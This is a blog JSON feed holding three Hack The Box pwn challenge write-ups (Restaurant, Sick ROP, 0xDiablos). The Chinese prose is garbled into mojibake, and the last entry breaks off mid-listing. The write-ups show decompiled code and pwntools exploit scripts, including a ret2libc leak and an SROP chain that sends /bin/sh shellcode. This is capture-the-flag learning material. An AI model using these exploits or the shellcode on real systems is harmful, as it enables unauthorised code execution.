{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY â€¢ All posts by \"pwn\" tag",
    "description": "æ‰¿è’™çš„æ˜¯å¸Œæœ› åšå‡ºä½ æƒ³åšçš„",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/HTB-Restauran/",
            "url": "https://lookhui.github.io/HTB-Restauran/",
            "title": "HTB-Restauran",
            "date_published": "2023-12-18T04:35:55.000Z",
            "content_html": "<h1 id=\"restauran\"><a class=\"anchor\" href=\"#restauran\">#</a> Restauran</h1>\n<p>ä¸€ç›´åˆ·æ¸—é€å¤šæ— èŠåœ¨ç©ç© pwn æ¥æ„Ÿå— pwnpwn çš„ä¹è¶£</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>æ²¡æœ‰å¼€ stack å’Œ pie</p>\n<p>è¿è¡Œçœ‹çœ‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ğŸ¥¡ Welcome to Rocky Restaurant ğŸ¥¡</span><br></pre></td></tr></table></figure></p>\n<p>åº”è¯¥æ˜¯ä¸€ä¸ªé¤å…ç®¡ç†ç³»ç»Ÿ</p>\n<p>ä½¿ç”¨ ida64 è¿›è¡Œè°ƒè¯•</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // ecx</span><br><span class=\"line\">  int v4; // er8</span><br><span class=\"line\">  int v5; // er9</span><br><span class=\"line\">  int v6; // edx</span><br><span class=\"line\">  int v7; // ecx</span><br><span class=\"line\">  int v8; // er8</span><br><span class=\"line\">  int v9; // er9</span><br><span class=\"line\">  __int64 v10; // rdx</span><br><span class=\"line\">  int v11; // ecx</span><br><span class=\"line\">  int v12; // er8</span><br><span class=\"line\">  int v13; // er9</span><br><span class=\"line\">  int v15; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  color((unsigned int)&amp;unk_401250, (unsigned int)&quot;cyan&quot;, (unsigned int)&quot;bold&quot;, v3, v4, v5);</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat would you like?&quot;, (unsigned int)&quot;green&quot;, v6, v7, v8, v9);</span><br><span class=\"line\">  printf(&quot;\\n1. Fill my dish.\\n2. Drink something\\n&gt; &quot;);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v15);</span><br><span class=\"line\">  if ( v15 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fill((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v15 != 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      color((unsigned int)&quot;\\nInvalid option! Exiting..\\n&quot;, (unsigned int)&quot;red&quot;, (unsigned int)&quot;bold&quot;, v11, v12, v13);</span><br><span class=\"line\">      exit(261);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    drink((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™ä¸ªæ˜¯ main å‡½æ•°é‡Œé¢çš„</p>\n<p>fill</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall fill(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v6; // ecx</span><br><span class=\"line\">  int v7; // er8</span><br><span class=\"line\">  int v8; // er9</span><br><span class=\"line\">  __int64 buf; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  color(</span><br><span class=\"line\">    (unsigned int)&quot;\\nYou can add these ingredients to your dish:&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;green&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;bold&quot;,</span><br><span class=\"line\">    a4,</span><br><span class=\"line\">    a5,</span><br><span class=\"line\">    a6,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL);</span><br><span class=\"line\">  puts(::a1);</span><br><span class=\"line\">  color((unsigned int)&quot;You can also order something else.\\n&gt; &quot;, (unsigned int)&quot;green&quot;, (unsigned int)&quot;bold&quot;, v6, v7, v8);</span><br><span class=\"line\">  read(0, &amp;buf, 0x400uLL);</span><br><span class=\"line\">  return printf(&quot;\\nEnjoy your %s&quot;, (const char *)&amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™ä¸ªæ¼æ´ç‚¹å¾ˆç®€å•å°±æ˜¯ ret2libc ä½†æ˜¯æˆ‘ä¸€ç›´æ‰“å°ä¸å‡ºæ ˆåœ°å€ï¼Œå¾ˆéš¾å—</p>\n<p>drink</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall drink(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  const char *v6; // rax</span><br><span class=\"line\">  int v8; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat beverage would you like?&quot;, (unsigned int)&quot;green&quot;, a3, a4, a5, a6);</span><br><span class=\"line\">  printf(a1Water2);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v8);</span><br><span class=\"line\">  if ( v8 == 1 || v8 == 2 )</span><br><span class=\"line\">    v6 = &quot;\\nEnjoy your drink!&quot;;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    v6 = &quot;\\nInvalid option&quot;;</span><br><span class=\"line\">  return puts(v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™é‡Œçš„è¯å°±æ˜¯ puts (v6 æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹)</p>\n<p>å†™åˆ°äº†è¿™é‡Œå‘ç°è¡Œä¸é€š</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">elf=ELF(&quot;./restaurant&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(b&quot;./libc.so.6&quot;)</span><br><span class=\"line\">#p=process(b&quot;./restaurant&quot;)</span><br><span class=\"line\">p=remote(&quot;167.99.85.216&quot;,32579)</span><br><span class=\"line\">puts=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">ret=0x40063e</span><br><span class=\"line\">rdi_pop=0x4010a3</span><br><span class=\"line\">fill=0x400E4A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts)+p64(fill)</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(str(1))</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">#p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)</span><br><span class=\"line\">a=p.recvline()</span><br><span class=\"line\">a+=p.recvline()</span><br><span class=\"line\">d=p.recvline()</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>å‘ç° pwn åŸæ¥ä¹Ÿè¿™ä¹ˆéš¾æœ‰ç‚¹ç¯å¢ƒé—®é¢˜å°± gg</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sick-ROP/",
            "url": "https://lookhui.github.io/HTB-Sick-ROP/",
            "title": "HTB-Sick_ROP",
            "date_published": "2023-12-13T11:04:07.000Z",
            "content_html": "<h1 id=\"sick-rop\"><a class=\"anchor\" href=\"#sick-rop\">#</a> Sick ROP</h1>\n<p>å¸¸è§„å¥—è·¯æ£€æŸ¥</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    No RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>ä½¿ç”¨ strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop.asm</span><br><span class=\"line\">read</span><br><span class=\"line\">write</span><br><span class=\"line\">vuln</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">_edata</span><br><span class=\"line\">_end</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.text</span><br></pre></td></tr></table></figure></p>\n<p>å‘ç°è²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ç‚¹</p>\n<p>æœ¬åœ°è¿è¡Œè°ƒè¯•å‘ç°æˆ‘è¾“å‡ºä»€ä¹ˆä»–å°±ä¼šç…§æ ·è¾“å‡º</p>\n<p>æ˜¯é™æ€çš„è¯æˆ‘ä»¬ä½¿ç”¨ ROPgadget --binary sick_rop --ropchain</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000401012 : and al, 0x10 ; syscall</span><br><span class=\"line\">0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x0000000000401044 : call qword ptr [rax + 0x41]</span><br><span class=\"line\">0x000000000040104c : dec ecx ; ret</span><br><span class=\"line\">0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401054 : jmp 0x40104f</span><br><span class=\"line\">0x000000000040104d : leave ; ret</span><br><span class=\"line\">0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401011 : push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401016 : ret</span><br><span class=\"line\">0x0000000000401049 : retf 0xffff</span><br><span class=\"line\">0x0000000000401014 : syscall</span><br></pre></td></tr></table></figure></p>\n<p>ç„¶åæ‹–å…¥ ida å‘ç°å°± 4 ä¸ªåŠŸèƒ½ï¼Œç¬¬ä¸€æ¬¡ç¢°åˆ°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  while ( 1 )</span><br><span class=\"line\">    vuln(a1, a2, a3, a4, a5, a6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>å¯åŠ¨å†™äº†ä¸€ä¸ªæ­»å¾ªç¯ä¸€ç›´è°ƒç”¨ vuln</p>\n<p>è€Œ vuln æ¨¡å—çš„è¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall vuln(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  size_t v6; // rax</span><br><span class=\"line\">  int v7; // edx</span><br><span class=\"line\">  int v8; // ecx</span><br><span class=\"line\">  int v9; // er8</span><br><span class=\"line\">  int v10; // er9</span><br><span class=\"line\">  const char *v11; // r10</span><br><span class=\"line\">  char v13[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = read(a1, a2, a3, a4, a5, a6, v13, 0x300uLL);</span><br><span class=\"line\">  return write(a1, a2, v7, v8, v9, v10, v11, v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è°ƒç”¨äº† read å’Œ write å‡½æ•°ï¼Œ</p>\n<p>è¿™ä¸ªæ—¶å€™æ„é€ æˆ srop</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./sick_rop&#x27;)</span><br><span class=\"line\">if args.R:</span><br><span class=\"line\"> p = remote(&quot;*.*.*.*&quot;,30479)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = elf.process()</span><br><span class=\"line\">context.clear(arch=&#x27;amd64&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">syscall_ret = 0x401014</span><br><span class=\"line\">read = 0x401000</span><br><span class=\"line\">writable = 0x400000</span><br><span class=\"line\">new_ret = 0x400018</span><br><span class=\"line\">vuln = elf.sym.vuln</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;A&#x27;*40    # to our offset</span><br><span class=\"line\">payload += p64(vuln)</span><br><span class=\"line\">payload += p64(syscall_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame(kernel=&quot;amd64&quot;)</span><br><span class=\"line\">frame.rax = 0xa     # syscall for mprotect()</span><br><span class=\"line\">frame.rdi = writable</span><br><span class=\"line\">frame.rsi = 0x4000</span><br><span class=\"line\">frame.rdx = 0x7    # rwx (read ,write , execute)</span><br><span class=\"line\">frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...</span><br><span class=\"line\">frame.rip = syscall_ret</span><br><span class=\"line\"></span><br><span class=\"line\">payload += bytes(frame) # fake sigreturnframe</span><br><span class=\"line\"></span><br><span class=\"line\"># sending</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;B&#x27;* (0xf - 1 ) # sigret 15 syscall</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"># shellcode</span><br><span class=\"line\">shell_code = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;</span><br><span class=\"line\">payload = shell_code.ljust(40, b&#x27;A&#x27;)</span><br><span class=\"line\">payload += p64(0x4010b8)</span><br><span class=\"line\">log.info(&#x27;[*] Sending second stage payload with &#123;&#125; bytes ...&#x27;.format(len(payload)))</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "url": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "title": "HTB-You_know_0xDiablos",
            "date_published": "2023-12-13T10:51:43.000Z",
            "content_html": "<h1 id=\"you-know-0xdiablos\"><a class=\"anchor\" href=\"#you-know-0xdiablos\">#</a> You know 0xDiablos</h1>\n<p>è¿™ä¸ªé¢˜çœŸçš„å¾ˆç®€å•ä¸€ä¸ª ret2text</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Partial RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      No PIE (0x8048000)</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>åˆæ˜¯ä¸€ä¸ª 32 ä½çš„ç¨‹åºä½¿ç”¨ strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdX</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">stdout</span><br><span class=\"line\">setresgid</span><br><span class=\"line\">getegid</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">Hurry up and try in on server side.</span><br><span class=\"line\">You know who are 0xDiablos:</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Debian 8.3.0-19) 8.3.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.6887</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">vuln.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">__x86.get_pc_thunk.bp</span><br><span class=\"line\">vuln</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">getegid@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">_dl_relocate_static_pie</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">setresgid@@GLIBC_2.0</span><br><span class=\"line\">flag</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.got</span><br><span class=\"line\">.got.plt</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span 